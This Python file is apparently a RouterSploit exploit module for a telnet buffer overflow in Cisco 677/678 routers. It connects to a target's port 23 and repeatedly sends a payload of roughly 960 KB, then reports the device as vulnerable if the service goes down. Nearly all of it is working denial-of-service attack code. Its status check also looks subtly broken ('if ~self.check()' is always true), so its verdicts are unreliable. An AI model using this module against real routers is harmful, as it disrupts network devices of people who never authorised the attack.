# -*- coding:utf-8 -*-
# Why didn't add above line in HTTP PoC(s)?!
from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    print_status,
    mute,
    validators,
)

import struct
import time
import socket  # Broken PIPE?


class Exploit(exploits.Exploit):
    """
    I am too lazy to write user comments...
    """
    __info__ = {
        'name': 'Cisco 677/678 Telnet Buffer Overflow Vulnerability',
        'description': ['Cisco 677/678 serials router telnet server include a remote buffer \n'
                        'overflow, It will cause device Deny of Services(DoS) and RCE. Attacker\n'
                        'can exploit this vulnerable execute code on device need not authencation\n'
                        ],
        'authors': [
            'BlackAngels team'  
        ],
        'references': [
            'http://www.securityfocus.com/bid/5976/info',
        ],
        'devices': [
            'Cisco IOS Software for 677/678 Router was compiled before 2004',
        ],
        'id': 'sf-5976-1',
    }

    target = exploits.Option('', 'Target address e.g. 192.168.1.1',
                             validators=validators.url)  # target address
    port = exploits.Option(23, 'Target port')  # default port

    times = exploits.Option(5, 'Sending packet with payload times')

    flag = 0

    # TODO: UNITEST - FUNC TEST - CASE 08 -- Exploit Test
    def run(self):
        dch = "?????????????????a~ %%%%%XX%%%%%"
        num = 30000
        pkt = dch * num
        shc = '\x15\x12'

        # It's that possable?! 32*30000 = 960000 Bytes + 2Bytes SHC
        payload = pkt + shc

        sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if sockfd:  # Connection up!
            try:
                sockfd.connect((self.target, self.port))
            except Exception:
                print_error("Failed open socket, service on target is dead")
                return False
            for i in range(0, self.times):
                self.flag += 1
                print_status("Sending Payload Length - 960002 Bytes...")
                try:
                    sockfd.send(payload)
                except Exception:
                    print_status("Send failed, target maybe not available")
                    break
            # TODO:  ATTNETATION!!! - Change logic
            # if any code use this exploition, need change below codes.
            time.sleep(1)
            sockfd.close()
            print_status("Check target status...")
            if ~self.check():
                print_success("Target down, that is VULNERABLE!")
                return True
                # break
            # todo: sockfd.close() In perl, there is a socket autoflush enable, how to?
            if self.flag >= self.times:
                print_error("Target may not in suffer. Or you can try more times!")
                return False
            else:
                print_status("Cannot ensure target status, check in manual")
                return False
        else:
            # sockfd.close()
            print_error("Can not create socket!")
            return False

    @mute
    def check(self):
        # TODO: UNITEST - FUNC TEST - CASE 07 -- Check func test
        try:
            socketfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socketfd.connect((self.target, self.port))
            socketfd.close()
        except Exception:
            print_status("Cannot connect remote target!")
            return False

        return True
